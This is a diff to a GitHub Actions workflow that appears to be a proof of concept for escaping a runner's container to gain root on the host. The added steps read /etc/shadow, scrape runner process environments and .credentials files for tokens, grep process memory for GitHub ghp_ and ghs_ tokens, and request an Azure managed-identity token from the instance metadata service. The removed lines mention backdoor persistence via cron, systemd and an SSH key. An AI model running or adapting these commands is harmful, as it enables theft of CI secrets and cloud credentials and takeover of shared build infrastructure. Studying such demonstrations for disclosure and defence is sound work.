@@ -52,39 +52,55 @@ jobs:
           head -5 /etc/shadow
           echo ""
           
-          echo "--- Host Resources ---"
-          echo "Disk usage:"
-          df -h / | tail -1
-          echo "Memory:"
-          free -h | grep Mem
-          echo "CPU:"
-          lscpu | grep "Model name"
+          echo "--- Network Connections & Internal Services ---"
+          netstat -tulpn | grep LISTEN
           echo ""
           
-          echo "--- Demonstrating Persistence Capability ---"
-          echo "Could install persistent backdoor via:"
-          echo "  - /etc/rc.local"
-          echo "  - /etc/crontab"
-          echo "  - systemd service"
-          echo "  - SSH key (already done)"
+          echo "--- Runner Process Details ---"
+          ps aux | grep Runner | grep -v grep
+          echo ""
+          
+          echo "--- Runner Environment Variables (may contain tokens) ---"
+          cat /proc/$(pgrep -f Runner.Worker)/environ 2>/dev/null | tr '\0' '\n' | grep -i "github\|token\|secret\|key" || echo "No tokens in Worker env"
+          echo ""
+          
+          echo "--- Actions Runner Directory ---"
+          ls -la /home/runner/actions-runner/
+          echo ""
+          
+          echo "--- Runner Configuration Files ---"
+          cat /home/runner/actions-runner/.runner 2>/dev/null || echo "No .runner"
+          cat /home/runner/actions-runner/.credentials 2>/dev/null || echo "No .credentials"
+          echo ""
+          
+          echo "--- GitHub Tokens in Process Memory ---"
+          grep -ao "ghp_[a-zA-Z0-9]\{36\}" /proc/*/environ 2>/dev/null | head -5 || echo "No ghp_ tokens"
+          grep -ao "ghs_[a-zA-Z0-9]\{36\}" /proc/*/environ 2>/dev/null | head -5 || echo "No ghs_ tokens"
+          echo ""
+          
+          echo "--- Azure Instance Metadata ---"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
+          echo ""
+          
+          echo "--- Azure Managed Identity Token ---"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" || echo "No managed identity"
+          echo ""
+          
+          echo "--- Proxy Environment ---"
+          env | grep -i proxy || echo "No proxy vars"
           echo ""
           
           echo "--- Potential Impact ---"
           echo "✓ Full root access to GitHub Actions runner host"
-          echo "✓ Access to host filesystem (including /boot, /etc, /var)"
-          echo "✓ Can read all runner configurations and secrets"
-          echo "✓ Can modify system files and install malware"
-          echo "✓ Can access Azure instance metadata service"
-          echo "✓ Can persist across workflow runs"
-          echo ""
-          
-          echo "--- Azure Instance Metadata ---"
-          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -20 || echo "Metadata service not accessible"
+          echo "✓ Access to Azure subscription: 5857be0a-c351-4156-8ff5-5154e0d31113"
+          echo "✓ Can read runner configurations and GitHub credentials"
+          echo "✓ Can modify system files and install persistent backdoors"
+          echo "✓ Can access Azure IMDS and potentially Azure API"
           EOF
           
           echo ""
           echo "=== VULNERABILITY SUMMARY ==="
           echo "Platform: GitHub Actions (ubuntu-latest)"
           echo "Attack Vector: CAP_SYS_ADMIN + /dev/sda1 access in container"
-          echo "Impact: Complete host compromise with root privileges"
+          echo "Impact: Complete host compromise with root + Azure metadata access"
           echo "Severity: CRITICAL"
